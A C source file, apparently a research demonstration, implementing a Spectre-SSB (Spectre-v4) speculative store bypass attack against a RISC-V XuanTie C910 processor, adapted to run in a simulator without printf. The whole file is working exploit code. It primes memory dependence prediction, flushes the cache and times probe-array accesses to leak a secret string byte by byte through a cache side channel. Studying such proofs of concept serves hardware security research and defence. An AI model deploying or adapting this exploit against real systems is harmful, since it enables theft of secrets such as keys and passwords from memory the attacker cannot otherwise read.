#include "../lib.c"

// No printf in RSD so all unnecessary printfs have been commented out.

#include <stdio.h>
#include <stdint.h>
#include <string.h> // For strlen()
#include <stdlib.h> // For rand() and srand()
#include <time.h> // For time(NULL)
#include "util_riscv.h"
#include "util_shared.h"
#include "cache.h"


/* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
/*
 * 1. Variable and function names are in lower camel case, i.e. camelCase, or sneak case, i.e. sneak_case.
 * 2. (at)input, (at)inout, etc may be used for preprocessors.
 */

/**
 * The following parameters vary with machines and are obtained from experiments,
 * using "control variates method" and "binary/half-interval/logarithmic search/".
 */
//#define TRAIN_TIMES 24 // (Spectre-SSB does not need trainning.) Times to train the predictor. There shall be an ideal value for each machine.
// Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
#define ATTACK_ROUNDS 3 // 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
// For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
#define CACHE_HIT_THRESHOLD 3 // 43 Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
// To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.

/* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */


#define DEFAULT_STRING "#Secret_Information!"
#define MAX_STRING_LENGTH_FACTOR 8
/**
 * Arbitrary as long as your machine allows it
 */

#define ARRAY_STRIDE L1_DCACHE_BLOCK_BYTES
/**
 * Reference from Lipp et al, 2018, Meltdown:
 * Based on the value of data in this example, a different part of the cache is accessed when executing the memory access out of order.
 * As data is multiplied by L1_DCACHE_BLOCK_BYTES (found with getconf PAGE_SIZE, typically 4096), data accesses to probe array are scattered over the array
 * with a distance of L1_DCACHE_BLOCK_BYTES Bytes (typically 4 KB, assuming an 1 B data type for probe array, e.g. uint8_t).
 * Thus, there is an injective mapping from the value of data to a memory page, i.e., different values for data never result in an access to the same page.
 * Consequently, if a cache line of a page is cached, we know the value of data.
 * The spreading over pages eliminates false positives due to the prefetcher, as the prefetcher cannot access data across page boundaries.
 * This prevents the hardware prefetcher from loading adjacent memory locations into the cache as well.
 */
 
/** 
 * Assume the attacker knows following information in advance: 
 * - Hardware specifications
 * - Control of an guideArray (address, contents, size) and an probeArray (contents, size)
 * - The start address of secretString (but no way to directly access contents of secretString)
 * - The character set of secretString and its size (such as extended ASCII which is 0~255, 8bit).
 */

/** 
 * Although there are no direct accesses to secretString, after being "trained" for a certain times,
 * vulnerable processors will "grow accustomed to" legitimate inputs (such as branch-not-taken) fed deliberately by the attacker, 
 * and mistakenly predict that succeeding illegitimate attempts wll also be true, fetching secretString into cache.
 * The attacker can then exploit the shortened access time (because of cache) and apply cache SCAs methods,
 * to infer characters of secretString one by one, using brutal force (exhausting all 256 possibities of extended ASCII).
 */

#define RESULT_ARRAY_SIZE 256
/**
 * In this example program, all secret characters are in extended ASCII codes (0~255, 8bit).
 * Ofc you may change it for others like Unicode, but that will complicate everything, 
 * and will also introduce REALLY high performance requirements.
 */

#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
/**
 * The size of probeArray can not be smaller than the max element of guideArray.
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
 * (Basically there is no point in designating these parameters of guideArray separately.)
 *
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient. 
 */

char* guideArray[ARRAY_SIZE_FACTOR];
// Data type follows "delayer" and "memoryDestination".
// TBD: optimize its array size to fit the later input "secretString".
uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];

/* Declare a global variable that prevents the compiler from optimizing out victimFunc() . */
uint8_t anchorVar = 0;

char** delayer[ARRAY_SIZE_FACTOR];
// Its size shall be set to that of the guideArray.
char knownString[ARRAY_SIZE_FACTOR];
// TBD: investigate relations between its values and guessed results. 

/**
 * @input idx input to be used to idx the array
 */
void victimFunc(uint32_t idx){

	// "Slowly" store a value at a memory location (here *memoryDestination).
	char **memoryDestination = *delayer;
	// "Quickly" load that value from that memory location.
	*memoryDestination = knownString;
	
	// Will only succeed on machines with MDP (Memory Dependence Prediction) mechanism.
	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];

}

// TBD: mix the order in other ways.
#define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
#define MIXER_B 1 // Arbitrary as long as larger than 0.

int main(void){
	
//	printf("****** Transient Execution Attack Demonstration ******\n");
//	printf("- Type of Attack: Spectre-SSB (a.k.a Spectre-v4)\n");
//	printf("- Target Chipset: RISC-V TH1520 SoC (Quad T-Head XuanTie C910)\n");
	
	char* defaultString = DEFAULT_STRING;
	int maxStringLength = strlen(defaultString) * MAX_STRING_LENGTH_FACTOR;
    // Fixed because there is no printf in RSD.
    char* secretString = DEFAULT_STRING;
	
    // Allocate memory for the string. 
	// Need to do this in main function because return 1 of subfunction will not terminate the main.
	//secretString = malloc(maxStringLength * sizeof(char));
	//if (secretString == NULL) {
	//	printf("Error: Memory allocation failed.\n");
	//	return 1; // Indicate error
	//}
	
	//dynamicInputString(defaultString, maxStringLength, secretString);
	
	uint32_t mixed_i;
	register uint32_t start, diff;
	uint32_t dummy;

	// Get the highest and second highest hit values in results().
	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
	// and its corresponding stored array value means cache hits.
	static uint32_t results[RESULT_ARRAY_SIZE];
	uint8_t output[2];
	uint32_t hitArray[2];
	
	char guessString[strlen(secretString)+1];
	/* Fill the guessString with NULL terminators. */
	for (int i = 0; i < sizeof(guessString); i++){
		guessString[i] = '\0';
	}

	/* Fill the knownString with NULL terminators. */
	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++){
		knownString[i] = '\0';
	}

	srand(time(NULL));

	/* Write to probeArray so in RAM not copy-on-write zero pages. */
	for (int i = 0; i < sizeof(probeArray); i++){
		probeArray[i] = 1;
	}

    // Memory address for displaying characters (in place of printf)
    volatile char* outputAddr = (char*)0x40002000;
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = 'S';
    *outputAddr = 't';
    *outputAddr = 'a';
    *outputAddr = 'r';
    *outputAddr = 't';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '\n';

//	printf("------ Start of Attack ------\n");
//	printf("MemAddr ~ StrOffset ~ TargetChar <-?-- GuessResult(Char, Dec, Hits)\n"); 

	// Note: strlen() calculates the length of a string up to, but not including, the terminating null \n character.
	// About strlen() function: https://en.cppreference.com/w/cpp/string/byte/strlen
	// Note: sizeof() does not care about the value of a string, so can not be used here.
	// Ref: https://www.geeksforgeeks.org/difference-strlen-sizeof-string-c-reviewed/
	for(uint32_t len = 0; len < (strlen(secretString)); len++){
		
		// Clear results every round.
		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
			results[cIdx] = 0;
		}

		// Run the attack on the same idx for ATTACK_ROUNDS times.
		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
			
			*delayer = guideArray;
			*guideArray = secretString;
			
			// Make sure array you read from is not in the cache.
			flushCache((uint32_t)delayer, sizeof(delayer));
			flushCache((uint32_t)probeArray, sizeof(probeArray));

			/* Delay (act as mfence, memory fence) */
			// Set of constant takens to make the BHR be in a all taken state				
			for(volatile int k = 0; k < ARRAY_SIZE_FACTOR; k++){
				asm("");
			}
			
			victimFunc(len); 
	
			// Read out probeArray and see the hit secret value.		
			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
				start = READ_CSR(cycle);
				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
				diff = (READ_CSR(cycle) - start);
			
				// Condition: interval of time is smaller than the threshold, AND the character is not a legal addreess value predefined.			
//				if ((uint32_t)diff < CACHE_HIT_THRESHOLD && mixed_i != knownString[len]){
				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
					results[mixed_i]++; /* Cache hit */
				}
			}
		}

		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
		results[0] ^= dummy;
		topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);

        // No printf in RSD
		//printf("MA[%p] ~ SO(%lu) ~ TC("ANSI_CODE_YELLOW"%c"ANSI_CODE_RESET") <-?-- GR("ANSI_CODE_CYAN"%c"ANSI_CODE_RESET", %d, %lu)\n", (uint8_t*)(secretString+len), len, secretString[len], output[0], output[0], hitArray[0]);

        *outputAddr = output[0];
        *outputAddr = '\n';

		guessString[len]=(char)output[0];
		
	}

    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = 'E';
    *outputAddr = 'n';
    *outputAddr = 'd';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '=';
    *outputAddr = '\n';
	//printf("------ End of Attack ------\n");
	
	//printf("------ Summary ------\n");
    //printf("Expected: "ANSI_CODE_YELLOW"%s"ANSI_CODE_RESET"\n", secretString);
	//printf("Guessed: "ANSI_CODE_CYAN"%s"ANSI_CODE_RESET"\n", guessString);
	//printf("****** That Is All for the Demonstration ******\n");
	
    // Since the size of the secret string is not dynamic anymore, the mem does not need to be freed.
	// Free the allocated memory after use.
	//free(secretString);

	return 0;
}